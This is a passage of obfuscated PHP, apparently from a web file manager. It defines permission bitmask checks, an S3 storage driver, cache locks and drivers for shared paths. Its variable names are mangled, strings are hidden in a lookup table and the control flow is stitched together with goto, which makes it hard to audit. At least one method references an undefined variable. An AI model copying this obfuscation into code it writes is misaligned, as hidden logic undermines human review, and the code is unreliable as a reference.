self::AUTH_EVENT), array($Ñ‡Øí¥[505] => LNG($Ñ‡Øí¥[2140]), $Ñ‡Øí¥[2133] => $Ñ‡Øí¥[2141], $Ñ‡Øí¥[2135] => 3, $Ñ‡Øí¥[2136] => 1, $Ñ‡Øí¥[2137] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ñ‡Øí¥[505] => LNG($Ñ‡Øí¥[2142]), $Ñ‡Øí¥[2133] => $Ñ‡Øí¥[2143], $Ñ‡Øí¥[2135] => 4, $Ñ‡Øí¥[2136] => 1, $Ñ‡Øí¥[2137] => self::AUTH_SHOW | self::AUTH_VIEW), array($Ñ‡Øí¥[505] => LNG($Ñ‡Øí¥[2144]), $Ñ‡Øí¥[2133] => $Ñ‡Øí¥[2145], $Ñ‡Øí¥[2135] => 5, $Ñ‡Øí¥[2136] => 1, $Ñ‡Øí¥[2137] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Ñ‡Øí¥[505] => LNG($Ñ‡Øí¥[2146]), $Ñ‡Øí¥[2133] => $Ñ‡Øí¥[2147], $Ñ‡Øí¥[2135] => 6, $Ñ‡Øí¥[2136] => 1, $Ñ‡Øí¥[2137] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Ñ‡Øí¥[505] => LNG($Ñ‡Øí¥[2148]), $Ñ‡Øí¥[2133] => $Ñ‡Øí¥[2149], $Ñ‡Øí¥[2135] => 7, $Ñ‡Øí¥[2136] => 1, $Ñ‡Øí¥[2137] => 0)); return $ó¬ğˆ€Ï; } public static function authCheck($øÙõÓ–, $Æù°›û‹, $ÎŞÍ´Â‰ = true) { $«»µìş® =& $_SERVER[öæÛ¿©¿]; $øÙõÓ– = intval($øÙõÓ–); if ($ÎŞÍ´Â‰) { if (KodUser::isRoot() && $GLOBALS[$«»µìş®[6]][$«»µìş®[2150]]) { return !0; } } if ($øÙõÓ– <= 0) { return !1; } if (($øÙõÓ– & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($øÙõÓ– & $Æù°›û‹); } public static function authCheckShow($²¾Ğ‹¦ì) { return self::authCheck($²¾Ğ‹¦ì, self::AUTH_SHOW); } public static function authCheckView($ÉŒíáâ™) { return self::authCheck($ÉŒíáâ™, self::AUTH_VIEW); } public static function authCheckDownload($àİüÆô) { return self::authCheck($àİüÆô, self::AUTH_DOWNLOAD); } public static function authCheckUpload($î¾œ±Œ) { return self::authCheck($î¾œ±Œ, self::AUTH_UPLOAD); } public static function authCheckEdit($ÎŞî’©¦) { return self::authCheck($ÎŞî’©¦, self::AUTH_EDIT); } public static function authCheckRemove($£ƒÆù±”) { return self::authCheck($£ƒÆù±”, self::AUTH_REMOVE); } public static function authCheckShare($Üş¹‰á×) { return self::authCheck($Üş¹‰á×, self::AUTH_SHARE); } public static function authCheckComment($öÕ¨¥Š) { return self::authCheck($öÕ¨¥Š, self::AUTH_COMMENT); } public static function authCheckEvent($øÏÎûä”) { return self::authCheck($øÏÎûä”, self::AUTH_EVENT); } public static function authCheckRoot($²å†Ëî¯) { return self::authCheck($²å†Ëî¯, self::AUTH_ROOT); } public static function authCheckAction($£„¹³˜Á, $’‘Ï½·) { $Àº´™¦ã =& $_SERVER[öæÛ¿©¿]; $…øò¢·ş = array($Àº´™¦ã[1505] => self::AUTH_SHOW, $Àº´™¦ã[1506] => self::AUTH_VIEW, $Àº´™¦ã[1327] => self::AUTH_DOWNLOAD, $Àº´™¦ã[108] => self::AUTH_UPLOAD, $Àº´™¦ã[1507] => self::AUTH_EDIT, $Àº´™¦ã[1276] => self::AUTH_REMOVE, $Àº´™¦ã[1508] => self::AUTH_SHARE, $Àº´™¦ã[430] => self::AUTH_COMMENT, $Àº´™¦ã[1509] => self::AUTH_EVENT, $Àº´™¦ã[1510] => self::AUTH_ROOT); if (!isset($…øò¢·ş[$’‘Ï½·])) { return; } $ÇéĞ¬¥· = $…øò¢·ş[$’‘Ï½·]; $£„¹³˜Á = intval($£„¹³˜Á); if ($£„¹³˜Á <= 0) { return !1; } if (($£„¹³˜Á & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($£„¹³˜Á & $ÇéĞ¬¥·); } public static function authDisable($Äªú›¸ˆ, $Šè®¸”) { if (intval($Äªú›¸ˆ) <= 0) { return 0; } return intval($Äªú›¸ˆ) & ~$Šè®¸”; } public $optionType = "\x53\171\x73\x74\x65\155\x2e\163\157\x75\x72\143\x65\x41\x75\164\x68\114\x69\163\x74"; public $field = array("\x6e\x61\155\145", "\x61\165\x74\x68", "\154\x61\x62\145\x6c", "\x64\151\x73\160\154\x61\x79", "\163\171\163\x74\145\155", "\x73\x6f\162\164"); public function initData() { $ÕŸ£óÄÂ = $this->authDefault(); foreach ($ÕŸ£óÄÂ as $â®’Âïå) { $this->add($â®’Âïå); } } public function findAuth($¿î±ŠÁƒ, $§¶ŒæÅË) { $ş—Ğ±è =& $_SERVER[öæÛ¿©¿]; $ïÜäø¾ = parent::listData(); foreach ($ïÜäø¾ as $ôÎ²Ñ£å) { $¤Ø“²™ú = intval($ôÎ²Ñ£å[$ş—Ğ±è[498]]); if ($¤Ø“²™ú <= 0 || $ôÎ²Ñ£å[$ş—Ğ±è[2151]] == 0) { continue; } if (($¤Ø“²™ú & $¿î±ŠÁƒ) != $¿î±ŠÁƒ) { continue; } if (($¤Ø“²™ú & $§¶ŒæÅË) != 0) { continue; } return $ôÎ²Ñ£å[$ş—Ğ±è[483]]; } return !1; } public function findAuthMax($å¤¶ÍÌ¯, $ÑÑó¿í) { $ôêÁ·‚ =& $_SERVER[öæÛ¿©¿]; $îÙáæİ¬ = !1; $ëÔ¶˜²‰ = parent::listData(); foreach ($ëÔ¶˜²‰ as $ï±€´À‘) { $“±–“ğ = intval($ï±€´À‘[$ôêÁ·‚[498]]); if ($“±–“ğ <= 0 || $ï±€´À‘[$ôêÁ·‚[2151]] == 0) { continue; } if (($“±–“ğ & $å¤¶ÍÌ¯) != $å¤¶ÍÌ¯) { continue; } if (($“±–“ğ & $ÑÑó¿í) != 0) { continue; } if (!$îÙáæİ¬) { $îÙáæİ¬ = $ï±€´À‘; continue; } if (intval($îÙáæİ¬[$ôêÁ·‚[498]]) < $“±–“ğ) { $îÙáæİ¬ = $ï±€´À‘; } } return $îÙáæİ¬ ? $îÙáæİ¬[$ôêÁ·‚[483]] : !1; } public function findAuthReadOnly() { $ßÛ¼ß Œ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $û‡¿Ñ¸“ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ßÛ¼ß Œ, $û‡¿Ñ¸“); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ûÏÁøğ® =& $_SERVER[öæÛ¿©¿]; $Æ¾•Ùß¦ = parent::listData(); $ñìÈ´²ã = !1; foreach ($Æ¾•Ùß¦ as $ßÔ—Áà¡) { if ($ßÔ—Áà¡[$ûÏÁøğ®[498]] <= 0 || $ßÔ—Áà¡[$ûÏÁøğ®[2151]] == $ûÏÁøğ®[229]) { continue; } if (!$ñìÈ´²ã) { $ñìÈ´²ã = $ßÔ—Áà¡; continue; } if ($ñìÈ´²ã[$ûÏÁøğ®[498]] > $ßÔ—Áà¡[$ûÏÁøğ®[498]]) { $ñìÈ´²ã = $ßÔ—Áà¡; } } return $ñìÈ´²ã ? $ñìÈ´²ã[$ûÏÁøğ®[483]] : $ûÏÁøğ®[12]; } public function listData($¹òîüÃ› = false, $Ù“øîÓ§ = "\x73\x6f\162\x74", $¢ø¥ƒÌÕ = false) { return parent::listData($¹òîüÃ›, $Ù“øîÓ§, $¢ø¥ƒÌÕ); } public function update($‚±‹š„ä, $°ë˜æçÉ) { $ ¢—“ùú =& $_SERVER[öæÛ¿©¿]; $öãËú = parent::listData($‚±‹š„ä); $îÙ™ı·“ = $this->findByName($°ë˜æçÉ[$ ¢—“ùú[32]]); if (!$öãËú || $îÙ™ı·“ && $îÙ™ı·“[$ ¢—“ùú[483]] != $öãËú[$ ¢—“ùú[483]]) { return !1; } $this->filterAuth($°ë˜æçÉ[$ ¢—“ùú[498]]); return parent::update($‚±‹š„ä, $°ë˜æçÉ); } public function remove($‘ğÉÇ€Ë) { $œç‘ığü = parent::listData($‘ğÉÇ€Ë); if (!$œç‘ığü || $œç‘ığü[$_SERVER[öæÛ¿©¿][190]]) { return !1; } return parent::remove($‘ğÉÇ€Ë); } public function add($èÖıšÚ– = array()) { $½‚·ïÃ± =& $_SERVER[öæÛ¿©¿]; if ($this->findByName($èÖıšÚ–[$½‚·ïÃ±[32]])) { return !1; } $ê®¯¶‡­ = array($½‚·ïÃ±[32] => $½‚·ïÃ±[12], $½‚·ïÃ±[498] => 1, $½‚·ïÃ±[2152] => $½‚·ïÃ±[2141], $½‚·ïÃ±[2151] => 1, $½‚·ïÃ±[190] => 0, $½‚·ïÃ±[2153] => 0); $èÖıšÚ– = array_merge($ê®¯¶‡­, $èÖıšÚ–); $èÖıšÚ–[$½‚·ïÃ±[2153]] = $this->getSort(); $this->filterAuth($èÖıšÚ–[$½‚·ïÃ±[498]]); return parent::insert($èÖıšÚ–); } private function getSort() { $Ğ¾åŸû° =& $_SERVER[öæÛ¿©¿]; $ãıêªš = parent::listData(); $İáôéå = array_to_keyvalue($ãıêªš, $Ğ¾åŸû°[12], $Ğ¾åŸû°[2153]); return empty($İáôéå) ? 0 : max($İáôéå) + 1; } private function filterAuth(&$ï®ÛøÔö) { if (!$ï®ÛøÔö) { return; } $ş™¾­ôÛ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $î¢½‹‹Í = array(); foreach ($ş™¾­ôÛ as $Ÿ×•®·ß) { if ($ï®ÛøÔö & $Ÿ×•®·ß) { $î¢½‹‹Í[] = $Ÿ×•®·ß; } } if (in_array(self::AUTH_ROOT, $î¢½‹‹Í)) { $ï®ÛøÔö = array_sum($ş™¾­ôÛ); return; } $¦ˆÀªµ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($î¢½‹‹Í as $Ÿ×•®·ß) { if (isset($¦ˆÀªµ[$Ÿ×•®·ß])) { $î¢½‹‹Í = array_merge($î¢½‹‹Í, $¦ˆÀªµ[$Ÿ×•®·ß]); } } $î¢½‹‹Í[] = self::AUTH_SHOW; $ï®ÛøÔö = array_sum(array_unique($î¢½‹‹Í)); } public function sort($œè›òÕ, $Ê¤ğÑîş) { return parent::update($œè›òÕ, $Ê¤ğÑîş); } } goto bÈŒ¥É„îÓ; Cè İçõ¯: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($›‹õ¯á) { $¡ÕéÚİ =& $_SERVER[öæÛ¿©¿]; parent::__construct($›‹õ¯á); $Âå¥¢á = isset($›‹õ¯á[$¡ÕéÚİ[257]]) && $›‹õ¯á[$¡ÕéÚİ[257]] == $¡ÕéÚİ[248] ? $¡ÕéÚİ[248] : $¡ÕéÚİ[314]; $this->setSignVersion($Âå¥¢á); } public function link($Ò“ÆÇûı, $©ç¶û¾ = array()) { return parent::link($Ò“ÆÇûı, $©ç¶û¾); } public function fileOut($Í¡‰èÊ­, $ñÒ¹ª = false, $ŠÚ¢—ø£ = false, $İğ‰öéá = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[öæÛ¿©¿][315])) { return parent::fileOutServer($Í¡‰èÊ­, $ñÒ¹ª, $ŠÚ¢—ø£, $İğ‰öéá); } parent::fileOut($Í¡‰èÊ­, $ñÒ¹ª, $ŠÚ¢—ø£, $İğ‰öéá); } public function fileOutImage($Š¹å¸, $õºú Ş = 250) { if (strstr($this->endpoint, $_SERVER[öæÛ¿©¿][315])) { return parent::fileOutImageServer($Š¹å¸, $õºú Ş); } parent::fileOutImage($Š¹å¸, $õºú Ş); } } define($_SERVER[öæÛ¿©¿][316], 1); define($_SERVER[öæÛ¿©¿][317], 2); goto eÙƒëî’×; F±®í°±ŸÙ: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ß ··„ò =& $_SERVER[öæÛ¿©¿]; $‰œÓ¡å = $GLOBALS[$ß ··„ò[6]][$ß ··„ò[425]]; self::$cachePath = $‰œÓ¡å[$ß ··„ò[231]][$ß ··„ò[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¬Ì€è¾À, $»Ø¦£º» = 0) { $‹ÆØƒ·™ =& $_SERVER[öæÛ¿©¿]; $ÌÔñÅ€ = microtime(!0); $Ãˆ›Œ¯ = $ÌÔñÅ€ + $»Ø¦£º» + 0.0001; $Û¼ßı¤É = rtrim(self::$cachePath, $‹ÆØƒ·™[8]) . $‹ÆØƒ·™[968] . md5($¬Ì€è¾À) . $‹ÆØƒ·™[965]; if (file_exists($Û¼ßı¤É) && filemtime($Û¼ßı¤É) && filemtime($Û¼ßı¤É) < time() - 10) { @unlink($Û¼ßı¤É); } do { if (file_exists($Û¼ßı¤É)) { cacheLockWait(); continue; } $¸û¬îŸ = fopen($Û¼ßı¤É, $‹ÆØƒ·™[969]); if (!$¸û¬îŸ) { return !1; } $¸ªÙÒ´­ = flock($¸û¬îŸ, LOCK_EX | LOCK_NB); self::$caches[$¬Ì€è¾À] = array($‹ÆØƒ·™[970] => $¸û¬îŸ, $‹ÆØƒ·™[231] => $Û¼ßı¤É); fwrite($¸û¬îŸ, $Ãˆ›Œ¯); clearstatcache(); if ($¸û¬îŸ && $¸ªÙÒ´­) { return !0; } cacheLockWait(); } while (microtime(!0) < $Ãˆ›Œ¯); $this->unlock($¬Ì€è¾À); return !1; } public function lockGet($ãÃæàì) { $ĞøŸŠ¨ =& $_SERVER[öæÛ¿©¿]; $’×ñ±¹à = rtrim(self::$cachePath, $ĞøŸŠ¨[8]) . $ĞøŸŠ¨[968] . md5($ãÃæàì) . $ĞøŸŠ¨[965]; return file_exists($’×ñ±¹à); } public function unlock($‹Ö¢ê™) { $Ê¡™Ã =& $_SERVER[öæÛ¿©¿]; $èÄˆ£Ş = self::$caches[$‹Ö¢ê™]; if (!$èÄˆ£Ş) { return; } @flock($èÄˆ£Ş[$Ê¡™Ã[970]], LOCK_UN); @fclose($èÄˆ£Ş[$Ê¡™Ã[970]]); @unlink($èÄˆ£Ş[$Ê¡™Ã[231]]); unset(self::$caches[$‹Ö¢ê™]); } } class CacheLockRedis { public function lock($Õáº‘†¦, $ŒÉä˜ëı = 10) { $Š¥óş„¼ = Cache::init(); $éè´¤™½ = microtime(!0) + $ŒÉä˜ëı; while (microtime(!0) < $éè´¤™½) { $ªæèÒäØ = $Š¥óş„¼->get($Õáº‘†¦); if (!$ªæèÒäØ) { $úÖíú· = $Š¥óş„¼->setLock($Õáº‘†¦, $éè´¤™½, $ŒÉä˜ëı); if ($úÖíú·) { return !0; } } else { if ($ªæèÒäØ < microtime(!0)) { $Š¥óş„¼->set($Õáº‘†¦, $éè´¤™½, $ŒÉä˜ëı * 2); if ($Š¥óş„¼->get($Õáº‘†¦) === $ªæèÒäØ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($äéœ›®¶) { return Cache::init()->get($äéœ›®¶); } public function unlock($ı¾ä¨ùê) { return Cache::init()->remove($ı¾ä¨ùê); } } goto dØâ¬»´Œ½; Aº§çà—¿Õ: class PathDriverDriverShareItem { public function __construct($“æÄ ÚÑ) { $this->pathParse = $“æÄ ÚÑ; } public function __call($ıœİ¦ÁŞ, $ËğÁöï») { $«§äü€¤ =& $_SERVER[öæÛ¿©¿]; if (method_exists($this, $ıœİ¦ÁŞ)) { return; } $­ş¸¡µ = call_user_func_array(array($«§äü€¤[1487], $ıœİ¦ÁŞ), $ËğÁöï»); $âóÕ‹ü = array($«§äü€¤[1488], $«§äü€¤[1489], $«§äü€¤[1490], $«§äü€¤[1491], $«§äü€¤[637], $«§äü€¤[639], $«§äü€¤[1492], $«§äü€¤[108], $«§äü€¤[1493], $«§äü€¤[1494]); if (in_array($ıœİ¦ÁŞ, $âóÕ‹ü)) { $­ş¸¡µ = $this->getPathOuter($­ş¸¡µ); } return $­ş¸¡µ; } public function copy($©™›…€Ö, $ÈÚäü¦µ, $Ëşöòåê = false, $¢ œÁ®Ñ = false) { return $this->copyMove($©™›…€Ö, $ÈÚäü¦µ, $Ëşöòåê, $_SERVER[öæÛ¿©¿][637], $¢ œÁ®Ñ); } public function move($ŒÜƒü¦, $‚„ÜšóÇ, $¢»ÖùÉò = false, $Î—Ï§‡ = false) { return $this->copyMove($ŒÜƒü¦, $‚„ÜšóÇ, $¢»ÖùÉò, $_SERVER[öæÛ¿©¿][639], $Î—Ï§‡); } private function copyMove($€Á¥ïÍÛ, $èÜ¹ïëß, $ó“ÌÓÃŠ, $îò°²ÚØ, $­îõá¯» = false) { $áÊ„éÅÏ =& $_SERVER[öæÛ¿©¿]; $¨’Ó£Š” = $èÜ¹ïëß; $¯ÉìÅ¥ = IO::driverMake($èÜ¹ïëß); if ($¯ÉìÅ¥->pathParse[$áÊ„éÅÏ[1279]]) { $èÜ¹ïëß = $¯ÉìÅ¥->pathParse[$áÊ„éÅÏ[1279]]; } else { $èÜ¹ïëß = $¨’Ó£Š”; } $¢Ÿƒ½Ó = IO::copyMove($€Á¥ïÍÛ, $èÜ¹ïëß, $ó“ÌÓÃŠ, $îò°²ÚØ, $­îõá¯»); $¢Ÿƒ½Ó = $this->getPathOuter($¢Ÿƒ½Ó); return $¢Ÿƒ½Ó; } public function pathThis($µÊúÈêê) { return get_path_this($this->pathParse[$_SERVER[öæÛ¿©¿][87]]); } public function pathFather($”—ä¹¹†) { return get_path_father($this->pathParse[$_SERVER[öæÛ¿©¿][87]]); } public function iconvSystem($ş˜”à¼ ) { return $ş˜”à¼ ; } protected function infoParse($™ÊÇİ„¦, $Êùïö‹ = false) { $€ø¤ø›ü =& $_SERVER[öæÛ¿©¿]; $±“¨‘ = $this->pathParse[$€ø¤ø›ü[572]][$€ø¤ø›ü[579]] . $this->pathParse[$€ø¤ø›ü[1298]]; if ($Êùïö‹) { $ÈÎÁ¥è‹ = IO::infoWithChildren($±“¨‘); } else { $ÈÎÁ¥è‹ = IO::info($±“¨‘); } $Ö­¸ë—„ = $this->pathParse[$€ø¤ø›ü[572]]; return Action($€ø¤ø›ü[1485])->_shareItemeParse($ÈÎÁ¥è‹, $Ö­¸ë—„); } public function listAll($Ÿ„ŠìÊ·) { $‡ƒÛÎæó =& $_SERVER[öæÛ¿©¿]; $Û¡ê‡Ùø = IO::listAll($Ÿ„ŠìÊ·); $Á’Ø¥ğµ = rtrim($this->pathParse[$‡ƒÛÎæó[572]][$‡ƒÛÎæó[579]], $‡ƒÛÎæó[8]); foreach ($Û¡ê‡Ùø as &$¿›ˆ›Íƒ) { $¿›ˆ›Íƒ[$‡ƒÛÎæó[87]] = $this->pathDriver . $‡ƒÛÎæó[8] . ltrim(substr($¿›ˆ›Íƒ[$‡ƒÛÎæó[87]], strlen($Á’Ø¥ğµ)), $‡ƒÛÎæó[8]); } unset($¿›ˆ›Íƒ); return $Û¡ê‡Ùø; } public function listAllSimple($®œ«§“º, $¦’úËã = false) { $ò§×òã =& $_SERVER[öæÛ¿©¿]; $ı‘’¥Ã = $this->listAll($®œ«§“º); $‡ÖøÑ«” = $this->pathParse[$ò§×òã[506]]; if (trim($‡ÖøÑ«”, $ò§×òã[8]) == trim(get_path_father($‡ÖøÑ«”), $ò§×òã[8])) { $¦’úËã = !0; } return IO::init($ò§×òã[12])->listAllSimpleMake($ı‘’¥Ã, $‡ÖøÑ«”, $¦’úËã); } public function getPathOuter($²“ßôÒŠ) { $‰ÔŒéœó =& $_SERVER[öæÛ¿©¿]; $ò±üİÁ­ = KodIO::parse($²“ßôÒŠ); if ($ò±üİÁ­[$‰ÔŒéœó[33]] == KodIO::KOD_SHARE_ITEM) { return $ò±üİÁ­[$‰ÔŒéœó[87]]; } $Ù‡“Ø€ú = KodIO::clear($²“ßôÒŠ); $ä»ÓÙ„ò = KodIO::clear($this->pathParse[$‰ÔŒéœó[572]][$‰ÔŒéœó[579]]); $•Í”úè = substr($Ù‡“Ø€ú, strlen($ä»ÓÙ„ò)); if (substr($Ù‡“Ø€ú, 0, strlen($ä»ÓÙ„ò)) != $ä»ÓÙ„ò) { return !1; } return $this->pathParse[$‰ÔŒéœó[1299]] . $‰ÔŒéœó[8] . ltrim($•Í”úè, $‰ÔŒéœó[8]); } public function getType() { $Á¶×›ºú =& $_SERVER[öæÛ¿©¿]; $÷Ò‡–è = str_replace($Á¶×›ºú[77], $Á¶×›ºú[12], get_class($this)); return strtolower($÷Ò‡–è); } public function isOsDriver($°“ÀÛ–§) { return IO::isOsDriver($°“ÀÛ–§); } public function info($ãŠ§ó¥) { return $this->infoParse($ãŠ§ó¥); } public function infoAuth($£İØØ…) { return $this->infoParse($£İØØ…); } public function infoWithChildren($ÕµÖñÄÊ) { return $this->infoParse($ÕµÖñÄÊ, !0); } public function infoFull($Ÿù´ø•) { return $this->infoParse($Ÿù´ø•); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($òÄ²ÃÆì) { $this->pathParse = $òÄ²ÃÆì; } protected function infoParse($ÔÄÉîó, $ÈŒ”µ¯ş = false) { $Áø´’áş =& $_SERVER[öæÛ¿©¿]; return Action($Áø´’áş[1305])->sharePathInfo($this->pathParse[$Áø´’áş[87]], !0, $ÈŒ”µ¯ş); } public function listPath($ úÅÄš›, $ªñ›ãÀË = false) { $‘“ç“‹Ô =& $_SERVER[öæÛ¿©¿]; $›¶ÉªÄª = IO::listPath($ úÅÄš›, $ªñ›ãÀË); if (!$›¶ÉªÄª) { return $›¶ÉªÄª; } if (is_array($›¶ÉªÄª[$‘“ç“‹Ô[1486]])) { $û™Æ ‚± = Action($‘“ç“‹Ô[1495])->parsePathChildren($›¶ÉªÄª[$‘“ç“‹Ô[1486]], array($‘“ç“‹Ô[506] => $ úÅÄš›)); $›¶ÉªÄª[$‘“ç“‹Ô[1486]] = Action($‘“ç“‹Ô[1305])->shareItemInfo($û™Æ ‚±); } foreach ($›¶ÉªÄª as $Š¿Ú‡µï => $£ÀË‚ûé) { if (!in_array($Š¿Ú‡µï, array($‘“ç“‹Ô[86], $‘“ç“‹Ô[85]))) { continue; } foreach ($£ÀË‚ûé as $·Ä®×‚ => $û™Æ ‚±) { $û™Æ ‚± = Action($‘“ç“‹Ô[1495])->parsePathChildren($û™Æ ‚±, array($‘“ç“‹Ô[506] => $ úÅÄš›)); $›¶ÉªÄª[$Š¿Ú‡µï][$·Ä®×‚] = Action($‘“ç“‹Ô[1305])->shareItemInfo($û™Æ ‚±); } } return $›¶ÉªÄª; } } class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($¨Î¦ÅßÆ) { $ôãÆæÈî =& $_SERVER[öæÛ¿©¿]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $¨Î¦ÅßÆ; $Ë¤Ø‚Şã = Model($ôãÆæÈî[683])->getInfo($¨Î¦ÅßÆ[$ôãÆæÈî[483]]); $ìú«ãà = _get($Ë¤Ø‚Şã, $ôãÆæÈî[576]); $»„¤ò®ü = Model($ôãÆæÈî[583])->authMake(_get($Ë¤Ø‚Şã, $ôãÆæÈî[1496])); if (!$Ë¤Ø‚Şã) { IO::errorTips(LNG($ôãÆæÈî[1497]), !1); } if (!$»„¤ò®ü) { IO::errorTips(LNG($ôãÆæÈî[1498]), !1); } if ($ìú«ãà && is_string($ìú«ãà)) { $ìú«ãà = json_decode($ìú«ãà, !0); } if (!$ìú«ãà || !$»„¤ò®ü) { return; } $this->_config = array($ôãÆæÈî[1299] => rtrim($¨Î¦ÅßÆ[$ôãÆæÈî[1299]], $ôãÆæÈî[8]) . $ôãÆæÈî[8], $ôãÆæÈî[1499] => $ôãÆæÈî[1406] . $ìú«ãà[$ôãÆæÈî[1500]] . $ôãÆæÈî[495], $ôãÆæÈî[572] => $Ë¤Ø‚Şã, $ôãÆæÈî[576] => $ìú«ãà, $ôãÆæÈî[1501] => $»„¤ò®ü, $ôãÆæÈî[1502] => substr(APP_HOST, 0, 8) == $ôãÆæÈî[218], $ôãÆæÈî[1503] => Model($ôãÆæÈî[587])->authCheck($»„¤ò®ü[$ôãÆæÈî[499]], AuthModel::AUTH_VIEW, !1), $ôãÆæÈî[1504] => Model($ôãÆæÈî[587])->authCheck($»„¤ò®ü[$ôãÆæÈî[499]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($“¯ùèø¤) { $Ã¼ßÇí =& $_SERVER[öæÛ¿©¿]; $¡©ë ”ô = $this->_config; if (!$¡©ë ”ô) { return !1; } $ù¬û˜¶» = array($Ã¼ßÇí[1505] => $¡©ë ”ô[$Ã¼ßÇí[1503]], $Ã¼ßÇí[1506] => $¡©ë ”ô[$Ã¼ßÇí[1503]], $Ã¼ßÇí[1327] => $¡©ë ”ô[$Ã¼ßÇí[1503]], $Ã¼ßÇí[108] => $¡©ë ”ô[$Ã¼ßÇí[1504]], $Ã¼ßÇí[1507] => $¡©ë ”ô[$Ã¼ßÇí[1504]], $Ã¼ßÇí[1276] => $¡©ë ”ô[$Ã¼ßÇí[1504]], $Ã¼ßÇí[1508] => !1, $Ã¼ßÇí[430] => !1, $Ã¼ßÇí[1509] => !1, $Ã¼ßÇí[1510] => !1); return $ù¬û˜¶»[$“¯ùèø¤]; } public function listPath($ËñË ĞÎ, $ÀŞ¶å¨ = false) { return $this->request($_SERVER[öæÛ¿©¿][1511], array($ËñË ĞÎ)); } public function setContent($ˆÊòÙëş, $ËÚĞ½Üº = '') { return $this->request($_SERVER[öæÛ¿©¿][1512], array($ˆÊòÙëş, $ËÚĞ½Üº)); } public function getContent($Óø¢öª“) { return $this->_fileSubstr($Óø¢öª“); } public function fileSubstr($ıö€ôß, $ˆúúÙı’, $Û•õ×¥¢) { return $this->_fileSubstr($ıö€ôß, $ˆúúÙı’, $Û•õ×¥¢); } public function download($†Ñ¨¥‹ç, $ÄûÅº„š) { return $this->_download($†Ñ¨¥‹ç, $ÄûÅº„š); } public function isFileOutServer() { return !1; } public function fileOut($üËË–, $Ó„Á‡Ü = false, $Â¡åØñê = false, $ì¦õÛ‹³ = '') { $“Ö†õ›Å =& $_SERVER[öæÛ¿©¿]; $this->fileOutLink($this->_fileLink($üËË–, ($ì¦õÛ‹³ ? $“Ö†õ›Å[1513] . $ì¦õÛ‹³ : $“Ö†õ›Å[12]) . ($Ó„Á‡Ü ? $“Ö†õ›Å[1514] : $“Ö†õ›Å[12]))); } public function fileOutImage($Ö×ˆÈÉ, $ğÑè£—ó = 250) { $this->fileOutLink($this->_fileLink($Ö×ˆÈÉ, $_SERVER[öæÛ¿©¿][1515] . $ğÑè£—ó)); } public function fileOutLink($ÈíÇû–”) { header($_SERVER[öæÛ¿©¿][173] . $this->urlAuto($ÈíÇû–”)); die; } public function exist($Ñ§ªû) { $Á£ğ…å = $this->_info($Ñ§ªû); return $Á£ğ…å ? !0 : !1; } public function isFile($³Ş–êâª) { $Ïò™†÷ =& $_SERVER[öæÛ¿©¿]; $ßè¢¬Ğ = $this->_info($³Ş–êâª); return _get($ßè¢¬Ğ, $Ïò™†÷[33], $Ïò™†÷[12]) == $Ïò™†÷[231]; } public function isFolder($â„¸òµ) { $òÔ¿È • =& $_SERVER[öæÛ¿©¿]; $…™¤×¡à = $this->_info($â„¸òµ); return _get($…™¤×¡à, $òÔ¿È •[33], $òÔ¿È •[12]) == $òÔ¿È •[78]; } public function size($¦ÔÂú¦) { $¾à„”áˆ = $this->_info($¦ÔÂú¦); return _get($¾à„”áˆ, $_SERVER[öæÛ¿©¿][79], 0); } public function info($Ş»àË×) { return $this->_info($Ş»àË×); } public function infoAuth($ÇÌ¶°¬) { return $this->_info($ÇÌ¶°¬); } public function infoFull($·‚›”Ê˜) { return $this->_info($·‚›”Ê˜); } public function infoFullSimple($ùÔĞ¶œ¼) { return $this->_info($ùÔĞ¶œ¼); } public function infoWithChildren($‘›ë†õ ) { return $this->_info($‘›ë†õ , !0); } public function has($ÌöÖªŠ¿, $ş ÀËÉÄ = false, $Ñä–ë•½ = false) { $ˆÆèÓø³ =& $_SERVER[öæÛ¿©¿]; $ŸŸÜÏˆ² = $this->_info($ÌöÖªŠ¿); if (!$ŸŸÜÏˆ²) { return !1; } if ($ş ÀËÉÄ) { return array($ˆÆèÓø³[240] => $ŸŸÜÏˆ²[$ˆÆèÓø³[240]], $ˆÆèÓø³[241] => $ŸŸÜÏˆ²[$ˆÆèÓø³[241]]); } return $æØ›Ï¿ ? $ŸŸÜÏˆ²[$ˆÆèÓø³[240]] > 0 : $ŸŸÜÏˆ²[$ˆÆèÓø³[241]] > 0; } public function mkfile($õ†İÙ, $ğÑƒí„ó = '', $œÖˆ‹Õ€ = REPEAT_RENAME) { return $this->request($_SERVER[öæÛ¿©¿][1488], array($õ†İÙ, $ğÑƒí„ó, $œÖˆ‹Õ€)); } public function 